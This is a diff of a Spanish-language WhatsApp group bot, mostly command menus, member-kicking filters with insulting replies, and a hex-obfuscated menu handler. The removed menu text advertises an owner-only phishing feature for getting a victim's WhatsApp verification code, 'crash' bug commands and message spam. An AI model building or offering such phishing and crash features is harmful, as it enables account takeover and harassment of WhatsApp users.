-${bodyM} ${prefix}nuevogrupo
-${bodyM} ${prefix}grupo abrir/cerrar
-${bodyM} ${prefix}getpic
-${bodyM} ${prefix}salir
-${bodyM} ${prefix}tagstick
-${bodyM} ${prefix}totag
-${bodyM} ${prefix}imagetag
-${bodyM} ${prefix}hidetag
-${bodyM} ${prefix}todos
-${bodyM} ${prefix}setdesc
-${bodyM} ${prefix}nombre
-${bodyM} ${prefix}adminlist
-${bodyM} ${prefix}setpic
-${bodyM} ${prefix}enlinea
-${bodyM} ${prefix}promote
-${bodyM} ${prefix}demote
-${bodyM} ${prefix}eliminar
-${bodyM} ${prefix}añadir *(Numero sin el +)*
-${bodyM} ${prefix}notif
-${bodyM} ${prefix}reply @miembro|frase|frase
-${bodyM} ${prefix}contacto @miembro|nombre
-${bodyM} ${prefix}link
-${bodyM} ${prefix}top5
-${bodyM} ${prefix}clonar`
-
-const Menud =  `☠️ Team SkullForce 500 ☠️  
-
-🔐Hola *${pushname}*
-
-♫♪.ılılıll|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|llılılı.♫♪
-
-${bodyM} ${prefix}play *(Descarga de musica)*
-${bodyM} ${prefix}playvid *(Descarga de videos por nombre)*
-${bodyM} ${prefix}ig *(Fotos y videos de Instagram)*
-${bodyM} ${prefix}twit *(videos de Twitter)*
-${bodyM} ${prefix}ytmp3 *(Descarga de musica por link)*
-${bodyM} ${prefix}ytmp4 *(Descarga de videos por link)*
-${bodyM} ${prefix}fb _(Link de FaceBook)_
-${bodyM} ${prefix}mfire *(Link de mediafire)*
-${bodyM} ${prefix}tomp3 *(Videos a audio)*
-${bodyM} ${prefix}letra *(Busca la letra de una cancion)*`
-
-const Menuo =  `☠️ Team SkullForce 500 ☠️                                                               
-
-
-${bodyM} ${prefix}grupos *(Ve los grupos del bot)*
-${bodyM} ${prefix}timer *(Cronometro)*
-${bodyM} ${prefix}calc *(Calculadora)*
-${bodyM} ${prefix}pregunta *(Haz una pregunta y el bot te responde)*
-${bodyM} ${prefix}ipbot *(Localiza al bot por ip)*
-${bodyM} ${prefix}ip *(Haz una loclizacion por ip)*
-${bodyM} ${prefix}igstalk *(Nombre de Usuario)*
-${bodyM} ${prefix}voz *(Codigo de idioma)* *(Texto)*
-		  _Para ver idiomas compatibles, usa el comando_ *idiomas*
-${bodyM} ${prefix}translate *(idioma a traducir = es, en, id...)*
-${bodyM} ${prefix}tiktokstalk @usuario
-${bodyM} ${prefix}hidetag *(Texto)*
-${bodyM} ${prefix}cambiar *(Cambia el cuerpo del menú)*
-${bodyM} ${prefix}shortlink _(Acortador de links)_
-${bodyM} ${prefix}pastebin *(genera link hacia el texto o link que escribas)*
-${bodyM} ${prefix}abinario *(texto a codigo binario)* 010010
-${bodyM} ${prefix}binatext *(codigo binario a texto)*
-${bodyM} ${prefix}aoctal *(texto a codigo octal)*
-${bodyM} ${prefix}octalatext *(codigo octal a texto)*
-${bodyM} ${prefix}ahex *(texto a codigo hex)*
-${bodyM} ${prefix}hexatext *(codigo hex a texto)*
-${bodyM} ${prefix}wa.me
-${bodyM} ${prefix}idioimas
-${bodyM} ${prefix}reversa
-${bodyM} ${prefix}meme
-${bodyM} ${prefix}leermas _frase/frase_
-${bodyM} ${prefix}mapa
-${bodyM} ${prefix}soyyo
-${bodyM} ${prefix}blocklist
-${bodyM} ${prefix}leerimagen
-
-*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
-    ☠️ Team SkullForce 500 ☠️ 
- ********************************`
- const Menu7 = ` ☠️ Team SkullForce 500 ☠️                                            
-
- si quieres apoyar al creador del bot y a quienes lo editores para skullgirls, puedes hacerlo por paypal:
- 
- https://www.paypal.me/samu330
- https://www.paypal.me/RoozMauro
- 
- 
- ${bodyM} ${prefix}neon *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}matrix *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}break *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}dropwater *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}lobo *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}flores *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}cross *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}seda *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}fire *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}glow *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}smoke *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}pubg *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}cielo *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}cs *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}ligth *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}navidad *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}nieve *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}tfire *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}playa *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}ff *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}goldbutton *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}silverbutton *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}3d *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}avengers *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}3d2 *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}ph *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}blackpink *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}marvel *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}hojas *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}tligth *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}gtext *(Escribe un texto para crear logo)*
- ${bodyM} ${prefix}gtav *(Etiqueta una imagen)*
- ${bodyM} ${prefix}wanted *(Etiqueta una imagen)*
- ${bodyM} ${prefix}wasted *(Etiqueta una imagen)*
- ${bodyM} ${prefix}ocean *(Etiqueta una imagen)*
- ${bodyM} ${prefix}ger *(Etiqueta una imagen)*
- ${bodyM} ${prefix}drawing *(Etiqueta una imagen)*
- ${bodyM} ${prefix}cg *(Etiqueta una imagen)*
- 
- *̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳*̳̳̳̳̳̳̳̳̳̳
-      ☠️ Team SkullForce 500 ☠️   
-  ******************************`
-  const Menu8 = `*COMANDOS PARA ${botNumber}*
-
-*Pará actualizar el bot:*
-_${prefix}actualizar_
-
-*Para apagar el bot:*
-_${prefix}apagar_
-
-
-⚠️ El siguiente comando es para restablecer los datos del usuario, para que el código vuelva a generarce, esto es por si quiere tener el bot en algún otro numero, o por si por error cerró la sección en WhatsApp. 
-
-*${prefix}Restaurar*
-
-Prueba el phishing de WhatsApp, cualquier frase que contenga la palabra: 'mantenimiento'
-funcionara para llamar al mensaje que te ayudara a obtener el codigo de verificacion de la victima, solo fuciona en privado y solo el numero del bot puede usarlo.
-
-╭─────────────
-│ *${prefix}ban*
-│ _Prohibe el uso del bot a una persona_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}unban*
-│ _Permite el uso del bot a una persona baneada_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}banchat*
-│ _Bloquea el uso del bot en los chats que se active_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}bloquear*
-│ _Bloquea usuarios_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}desbloquear*
-│ _Desbloquea usuarios_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}setname*
-│ _Cambia tu nombre de usuario_
-│
-│ *${prefix}setpic*
-│ _Actualiza tu foto de perfil_
-│
-│ *${prefix}setstatus*
-│ _Cambia tu estado de WhatsApp_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}estado*
-│ _Envia un estado de texto_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}estadopic*
-│ _Envia una imagen a tu estado_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}estadovid*
-│ _Envia un video a tu estado_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}vaciar*
-│ _Vacia el chat_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}vaciartodo*
-│ _Elimina todos los chats_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}bc*
-│ _Broadcast_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}spam*
-│ _Spam de mensajes_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}fijar*
-│ _Fijar el chat_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}desfijar*
-│ _Desfija el chat_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}archivar*
-│ _Archiva un chat_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}desarchivar*
-│ _Desarchiva todo_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}silencio*
-│ _Mutea un chat_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}desilenciar*
-│ _Desmutea un chat_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}sinleer*
-│ _Muestra Chats sin leer_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}apagar*
-│ _Apaga el bot_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}marcarsinleer*
-│ _Marca como no leido todos los chats_
-╰─────────────╮
-╭─────────────╯
-│ *${prefix}leertodo*
-│ _Lee todos los chats_
-╰─ ☠️ Team SkullForce 500 ☠️ `
-
-const menu9 = `*${pushname}*
-
-_Estos comandos solo pueden ser utilizados en grupos, y solo los puede usar ${botNumber}_
-
-🔥 ${prefix}crash
-🔥 ${prefix}crash2
-🔥 ${prefix}crash3
-🔥 ${prefix}crashloc
-🔥 ${prefix}crashcom
-🔥 ${prefix}crashpc
-
-💠Si quieres ser inmune a estos comandos, el creador del bot tiene un WhatsApp que soporta estos bugs,  comunicate con el:
-
-* ☠️ Team SkullForce 500 ☠️  *
-
-No promovemos estas actividades, cualquier intento de usar estos comandos sera sancionado...
-
-
-
-
-
-`
-
-        if (isAntiBot && m.message && !m.key.fromMe && m.isBaileys) {
-            reply(`*✏Bot detectado!!*\n\nEN ESTE GRUPO ESTAN PROHIBIDOS OTROS BOTS!!\n\n🌬 Bye.....`)
-            samu330.groupRemove(from, m.participants)
-        }
 
 		if ((Object.keys(sam.message)[0] === 'ephemeralMessage' && JSON.stringify(sam.message).includes('EPHEMERAL_SETTING')) && sam.message.ephemeralMessage.message.protocolMessage.type === 3) {
 			bugquien = sam.participants[0]
@@ -1619,7 +1062,7 @@ No promovemos estas actividades, cualquier intento de usar estos comandos sera s
 			if (!itsMe) {
 			if (isAudio) {
 			if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)
-				reply(`*AUDIO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n☠️ Team SkullForce 500 ☠️ , 𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
+				reply(`*AUDIO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
 				samu330.groupRemove(from, [sender])
 			}
 			}
@@ -1628,7 +1071,7 @@ No promovemos estas actividades, cualquier intento de usar estos comandos sera s
 			if (!itsMe) {                        
 			if (isContact) {
                         if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                  
-				reply(`*CONTACTO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n☠️ Team SkullForce 500 ☠️,  𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
+				reply(`*CONTACTO DETECTADO, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)
 				samu330.groupRemove(from, [sender])              
 			}               
 			}                     
@@ -1649,8 +1092,8 @@ No promovemos estas actividades, cualquier intento de usar estos comandos sera s
 			if (isGroup && botAdmin && isAntiLeg) {                                                         	  
 			if (!itsMe) {                                 
 			if (isLocation) {
-                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no???\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                     
-				reply(`*LOCALIZACION DETECTADA, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n☠️ Team SkullForce 500 ☠️ , 𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)                   
+                        if (isAdmin) reply(`😒che admin pndejo, enves que des el ejemplo, ya que el Antilegiones esta activado, osea que no se permiten toda clase de mensajes que puedan ser travas... pero noooo... como eres admin te crees la gran vrg no?🙄\n*Pues conmigo te jodiste😑*\nALV por puto👿`)                                                                     
+				reply(`*LOCALIZACION DETECTADA, EN ESTE GRUPO NO SE PERMITEN LOS AUDIOS, YA QUE ESTAN ACTIVADOS LOS COMANDOS ANTILEGIONES, POR SEGURIDAD TE ELIMINARE*\n\n🛃 ESTE GRUPO ESTA PROTEGIDO POR:\n𝚂𝚊𝚖𝚞𝟹𝟹𝟶® | NyanBot™\n\n*🐉Samu330*`)                   
 				samu330.groupRemove(from, [sender])           
 			}             
 			}                     
@@ -1695,14 +1138,14 @@ No promovemos estas actividades, cualquier intento de usar estos comandos sera s
 			switch (commandstik) {
 	
 				case "paxuDk3LoZENYGIbqq0jI7+xHaEaDfGaWGtVJt/Vyzg=":
-					redes = ['respeta las reglas del grupo', 'disfrutemos de este maravilloso juego']
+					redes = ['*sientete libre de preguntar lo que quieras* ', '*somos amig@s,herman@s, familia*']
 					opcion = redes[Math.floor(Math.random() * redes.length)]
 reply(`*Si no ves la lista de comandos, o no puedes hacer click en el boton, desactiva la funcion de hacer el texto seleccionable en las configuraciones de tu whatsapp Mod.*
 _Si siges teniendo problemas, usa el menu antiguo, escribiendo: ${prefix}menuofc_`)
 let newmenu = samu330.prepareMessageFromContent(from, {
 "listMessage":  {
-"title": "*✍🏻MENU | SKULLGIRLS | TEAM SKULLFORCE 500*",
-"description": `\n➫BOT PARA SKULLGIRLS MOBILE
+"title": "*✍🏻MENU | skullgirl | ☠ TeamSkullForce500 ☠*",
+"description": `\n➫bot dedicado a skullgirls
 🔐Hola *${pushname}* ${timeFt}
 _Tipo de usuario:_ ${tipoDeUsr}
 ┎┈┈┈┈┈┈┈┈┈┈┈┈┈┈
@@ -1722,16 +1165,16 @@ ${samu}◦ 🪀version de${samu} *WhatsApp* : *${samu330.user.phone.wa_version}*
 
 ༶•┈┈⛧┈♛ ♛┈⛧┈┈•༶
 
-*RECUERDA LEER LAS REGLAS*
+*recuerda leer las reglas*
 
+unete a nuestras redes:
 
-UNETE A NUESTRAS REDES:
 - YOUTUBE: https://youtube.com/channel/UCXTq1tujjskc6gav25gfViA
 - DISCORD: https://discord.gg/Drj7K5Km6k
 - TELEGRAM: https://t.me/joinchat/njRnJG1UCMJjNDcx
-- WHATSAPP+18: https://chat.whatsapp.com/JMMeIF9XBi11NQCAJlfBiZ
+- WHATSAPP +18: https://chat.whatsapp.com/JMMeIF9XBi11NQCAJlfBiZ
 
-¡¡DISFRUTA TU TIEMPO EN EL GRUPO!!
+*¡DISFRUTA TU TIEMPO EN EL GRUPO!*
 
 ${opcion}`,
 							"buttonText": "Selecciona tu menu",
@@ -1792,122 +1235,9 @@ ${opcion}`,
 				break
 			}
 
-            if (sam.message.listResponseMessage){
-				test = sam.message.listResponseMessage.singleSelectReply.selectedRowId
-				if (test.includes(`media`)){
-                    if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊Hola, ${timeFt}.\n*Yo soy Sam330*, Asistente de *Samu330*!.\n\nAl parecer no estas registrado en _*NyanBot*_, Para registrarte usa el comando: *${prefix}reg*.`, thumbnail: assistant, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
-                    trol = fs.readFileSync('./media/trol.mp4')
-                    samu330.sendMessage(from, trol, video, {mimetype: 'video/mp4', caption: `${mda}`, duration: -9999999, thumbnail: fs.readFileSync('./media/reply.png'), sendEphemeral: true, quoted:
-                    { key: {
-                    fromMe: false,
-                    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
-                    },
-                    message: {
-                    "imageMessage": { "caption": "🧸𝙈𝙀𝙉𝙐⁡ 𝘿𝙀 𝙈𝙀𝘿𝙄𝘼📌", 'jpegThumbnail': fs.readFileSync('./src/assistant.jpg')}}
-                    }})
-                    addFilter(from)
-                    addLevelingLevel(sender, 5)
-			}
-			}
+var _0xdf3d=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x52\x6F\x77\x49\x64","\x73\x69\x6E\x67\x6C\x65\x53\x65\x6C\x65\x63\x74\x52\x65\x70\x6C\x79","\x6D\x65\x64\x69\x61","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x2E\x2F\x73\x72\x63\x2F\x61\x73\x73\x69\x73\x74\x61\x6E\x74\x2E\x6A\x70\x67","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\uD83D\uDE0A\x48\x6F\x6C\x61\x2C\x20","\x2E\x5C\x6E\x2A\x59\x6F\x20\x73\x6F\x79\x20\x53\x61\x6D\x33\x33\x30\x2A\x2C\x20\x41\x73\x69\x73\x74\x65\x6E\x74\x65\x20\x64\x65\x20\x2A\x53\x61\x6D\x75\x33\x33\x30\x2A\x21\x2E\x5C\x6E\x5C\x6E\x41\x6C\x20\x70\x61\x72\x65\x63\x65\x72\x20\x6E\x6F\x20\x65\x73\x74\x61\x73\x20\x72\x65\x67\x69\x73\x74\x72\x61\x64\x6F\x20\x65\x6E\x20\x5F\x2A\x4E\x79\x61\x6E\x42\x6F\x74\x2A\x5F\x2C\x20\x50\x61\x72\x61\x20\x72\x65\x67\x69\x73\x74\x72\x61\x72\x74\x65\x20\x75\x73\x61\x20\x65\x6C\x20\x63\x6F\x6D\x61\x6E\x64\x6F\x3A\x20\x2A","\x72\x65\x67\x2A\x2E","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x0D\x0A\x09\x09\x09\x09\x09\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x20\u25C8\x20\x20\uD835\uDE48\uD835\uDE40\uD835\uDE49\uD835\uDE50\u206A\u2061\u205F\uD835\uDE3F\uD835\uDE40\x20\uD835\uDE48\uD835\uDE40\uD835\uDE3F\uD835\uDE44\uD835\uDE3C\x20\u25C8\x20\x20\u2563\x0D\x0A\x09\x09\x09\x09\x09\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x63\x6C\x69\x6D\x61\x2A\x20\x2B\x20\x72\x65\x67\x69\x6F\x6E\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x6C\x20\x63\x6C\x69\x6D\x61\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x7A\x61\x6C\x67\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x54\x65\x78\x74\x6F\x20\x65\x73\x74\x69\x6C\x6F\x20\x7A\x61\x6C\x67\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x63\x6F\x6E\x74\x61\x72\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x43\x75\x65\x6E\x74\x61\x20\x63\x61\x72\x61\x63\x74\x65\x72\x65\x73\x20\x64\x65\x20\x75\x6E\x20\x74\x65\x78\x74\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x63\x61\x72\x61\x73\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x61\x20\x69\x6D\x61\x67\x65\x6E\x20\x70\x61\x72\x61\x20\x64\x65\x74\x65\x63\x74\x61\x72\x20\x63\x61\x72\x61\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x71\x75\x65\x6D\x75\x73\x69\x63\x61\x65\x73\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x42\x75\x73\x63\x61\x20\x65\x6C\x20\x6E\x6F\x6D\x62\x72\x65\x20\x64\x65\x20\x6C\x61\x73\x20\x63\x61\x6E\x63\x69\x6F\x6E\x65\x73\x20\x71\x75\x65\x20\x6E\x6F\x20\x63\x6F\x6E\x6F\x7A\x63\x61\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x69\x6D\x61\x67\x65\x6E\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x42\xFA\x73\x71\x75\x65\x64\x61\x20\x64\x65\x20\x69\x6D\xE1\x67\x65\x6E\x65\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x65\x6E\x20\x47\x6F\x6F\x67\x6C\x65\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x73\x69\x6E\x66\x6F\x6E\x64\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x51\x75\x69\x74\x61\x20\x66\x6F\x6E\x64\x6F\x20\x61\x20\x69\x6D\x61\x67\x65\x6E\x65\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x77\x70\x2A\x20\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x42\xFA\x73\x71\x75\x65\x64\x61\x20\x64\x65\x20\x66\x6F\x6E\x64\x6F\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x64\x65\x20\x70\x61\x6E\x74\x61\x6C\x6C\x61\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x70\x61\x72\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x41\x6E\x69\x6D\x65\x20\x70\x61\x72\x61\x20\x63\x6F\x6D\x70\x61\x72\x74\x69\x72\x20\x70\x65\x72\x66\x69\x6C\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x28\x68\x6F\x6D\x62\x72\x65\x20\x7C\x20\x6D\x75\x6A\x65\x72\x65\x73\x29\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x61\x6E\x69\x6D\x65\x76\x69\x64\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x56\x69\x64\x65\x6F\x73\x20\x61\x6E\x69\x6D\x65\x20\x63\x6F\x72\x74\x6F\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x71\x75\x65\x61\x6E\x69\x6D\x65\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x61\x20\x69\x6D\x61\x67\x65\x6E\x20\x64\x65\x20\x75\x6E\x20\x41\x6E\x69\x6D\x65\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x50\x61\x72\x61\x20\x73\x61\x62\x65\x72\x20\x71\x75\x65\x20\x61\x6E\x69\x6D\x65\x20\x65\x73\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x6C\x6F\x6C\x69\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x6E\x65\x6B\x6F\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u255F\u257C\u257E\u2524\uD83C\uDFA7\uD835\uDE08\uD835\uDE36\uD835\uDE25\uD835\uDE2A\uD835\uDE30\uD835\uDE34\uD83C\uDFA7\u251C\u257C\u257E\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x62\x61\x73\x73\x2A\x0D\x0A\x09\x09\x09\x09\x09\u2551\x20\x5F\x45\x74\x69\x71\x75\x65\x74\x61\x20\x75\x6E\x20\x61\x75\x64\x69\x6F\x5F\x0D\x0A\x09\x09\x09\x09\x09\u2551\x0D\x0A\x09\x09\x09\x09\x09\u2560\x20\x2A\u25CF","\x61\x72\x64\x69\x6C\x6C